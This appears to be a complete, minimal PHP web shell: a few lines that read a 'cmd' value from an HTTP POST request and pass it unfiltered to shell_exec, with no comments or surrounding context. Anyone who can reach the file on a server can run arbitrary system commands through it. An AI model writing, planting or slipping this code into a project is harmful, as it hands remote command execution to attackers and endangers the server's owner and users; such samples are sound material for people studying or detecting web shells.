<?php
function execute($com)
{
    shell_exec($com);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
?>